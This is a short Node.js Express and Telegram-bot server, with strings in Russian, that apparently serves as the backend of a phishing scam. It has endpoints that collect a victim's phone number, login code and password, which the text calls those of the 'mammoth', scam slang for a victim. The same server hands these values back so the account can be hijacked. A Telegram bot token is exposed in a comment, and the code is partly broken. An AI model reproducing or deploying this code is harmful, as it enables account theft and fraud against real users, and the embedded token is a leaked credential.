const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const app = express();
const port = 3000;
const cors = require('cors');
const WebSocket = require('ws');
const bot = new TelegramBot(token, { polling: true }); 

//6665171831:AAEu1c2-Dn5IX341G4r8GlXir8EImcjWFOI

app.use(express.json());

app.use(cors({
    origin: '*',
    methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
    credentials: true,
    optionsSuccessStatus: 204,
    allowedHeaders: ['Content-Type', 'Authorization'],
}));

var pn;
var code;
var pass;

app.post('/phone', (req, res) => {
    const phone_number = req.body.phone_number;
    if (phone_number) {
        console.log(`Принятый номер телефона: ${phone_number}`);
        res.json({ message: `Принятый номер телефона: ${phone_number}` });
    } else {
        console.log('Номер телефона неопределен.');
        res.status(400).json({ error: 'Номер телефона неопределен.' });
    }
});

app.get('/getPhone', (req, res) => {
    if (pn) {
        res.send(`Номер телефона мамонта: \n ${pn}`);
        pn = undefined;
        return 0;
    } else {
        res.status(404).send('Номер телефона мамонта не найден.');
        return 0;
    }
});

app.post('/authCode', (req, res) => {
    const value = req.body.value;
    if (typeof value !== 'undefined') {
        code = value;
        console.log(`Код мамонта: ${value}`);
        res.json({ message: `Код мамонта: ${value}` });
        return;
    } else {
        console.log('Код мамонта неопределен.');
        res.status(400).json({ error: 'Код мамонта неопределен.' });
        return;
    }
});

app.get('/getCode', (req, res) => {
    if (code) {
        res.send(`Код мамонта:\n${code}`);
        code = undefined;
        return 0;
    } else {
        res.status(404).send('Код мамонта не найден.');
        return 0;
    }
});

app.post('/password', (req, res) => {
    const password = req.body.passwordInput;
    if (typeof password !== 'undefined') {
        pass = password;
        console.log(`Пароль мамонта: ${password}`);
        res.json({ message: `Пароль мамонта: ${password}` });
        return;
    } else {
        console.log('Пароль мамонта неопределен.');
        res.status(400).json({ error: 'Пароль мамонта неопределен.' });
        return;
    }
});

app.get('/getPassword', (req, res) => {
    if (pass) {
        res.send(`Пароль мамонта: \n ${pass}`);
        pass = undefined;
        return;
    } else {
        res.status(404).send('Пароль мамонта не найден.');
        return;
    }
});

app.get('/', (req, res) => {
    res.send('Salam Alejkum, Denis Penis!');
});

app.listen(port, () => {
    console.log(`Сервер запущен на порту ${port}`);
});
